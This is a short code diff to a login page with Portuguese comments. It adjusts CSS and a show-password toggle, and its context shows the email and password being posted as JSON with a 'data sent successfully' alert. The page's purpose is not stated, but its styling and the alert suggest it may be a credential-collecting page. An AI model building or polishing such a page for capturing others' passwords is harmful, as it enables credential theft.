@@ -50,7 +50,7 @@
       color:var(--text);
       margin-bottom:14px;
     }
-    input[type="password"]{
+    input[type="password"], input[type="text"]{
       padding:14px;
       font-size:15px;
       border:1px solid #dadce0;
@@ -135,17 +135,19 @@
         headers: {
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ email, senha })
+        body: JSON.stringify({ email, senha }) // envia corretamente a senha
       })
       .then(() => alert('Dados enviados com sucesso!'))
       .catch(() => alert('Erro ao enviar os dados.'));
     });
 
-    // Mostrar/ocultar senha
+    // Mostrar/ocultar senha sem alterar fonte
     const pwField = document.getElementById('passwordField');
     const toggle = document.getElementById('togglePassword');
     toggle.addEventListener('change', function() {
+      const currentFontSize = pwField.style.fontSize || '15px';
       pwField.type = this.checked ? 'text' : 'password';
+      pwField.style.fontSize = currentFontSize; // mantém tamanho da fonte
     });
   </script>
 
